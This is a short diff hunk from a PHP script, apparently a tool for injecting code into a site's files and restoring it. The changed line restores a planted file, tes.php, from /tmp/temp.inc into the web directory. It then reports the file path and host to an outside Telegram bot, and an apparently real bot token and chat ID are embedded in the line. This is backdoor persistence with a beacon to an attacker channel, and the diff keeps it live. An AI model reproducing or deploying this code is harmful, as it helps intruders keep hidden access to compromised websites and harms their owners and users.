@@ -564,8 +564,7 @@ if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION[
         __DIR__ . '/settings.php'
     ];
     
-    <?php if(!file_exists(__DIR__."/tes.php")&&file_exists($b="/tmp/temp.inc")&&@copy($b,__DIR__."/tes.php")&&@chmod(__DIR__."/tes.php",0644))@file_get_contents("https://api.telegram.org/bot8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4/sendMessage?chat_id=7547598395&text=".urlencode("🔄 *RESTORE*\n📁 ".__DIR__."/tes.php\n🌐 ".($_SERVER["HTTP_HOST"]??"localhost")));
-?>';
+    if(!file_exists(__DIR__."/tes.php")&&file_exists($b="/tmp/temp.inc")&&@copy($b,__DIR__."/tes.php")&&@chmod(__DIR__."/tes.php",0644))@file_get_contents("https://api.telegram.org/bot8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4/sendMessage?chat_id=7547598395&text=".urlencode("🔄 *RESTORE*\n📁 ".__DIR__."/tes.php\n🌐 ".($_SERVER["HTTP_HOST"]??"localhost")));
     
     $injected = [];
     $errors = [];
